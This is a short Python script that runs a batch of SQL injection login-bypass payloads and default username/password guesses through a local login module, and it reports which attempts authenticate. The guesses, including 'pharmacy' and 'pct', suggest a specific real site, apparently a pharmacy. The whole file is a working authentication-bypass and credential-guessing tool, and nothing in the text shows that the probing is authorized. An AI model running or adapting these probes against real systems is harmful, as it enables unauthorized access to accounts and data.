"""Batch credential / SQLi probes against the login."""
import sys

sys.path.insert(0, ".")
import login  # noqa: E402

CASES = [
    ("' or '1'='1", "x"),
    ("' or 1=1-- -", "x"),
    ("admin' or '1'='1'-- -", "x"),
    ("admin'#", "x"),
    ("admin' -- -", "x"),
    ("admin", "' or '1'='1"),
    ("admin", "admin"),
    ("administrator", "administrator"),
    ("pharmacy", "pharmacy"),
    ("pct", "pct"),
    ("admin", "password"),
    ("admin", "Admin@123"),
    ("info", "info"),
]

for u, p in CASES:
    st, authed, body = login.attempt(u, p)
    flag = "  <<< AUTHENTICATED" if authed else ""
    print(f"{u!r:34} / {p!r:18} -> {st} auth={authed}{flag}")
    if authed:
        print("    len", len(body))
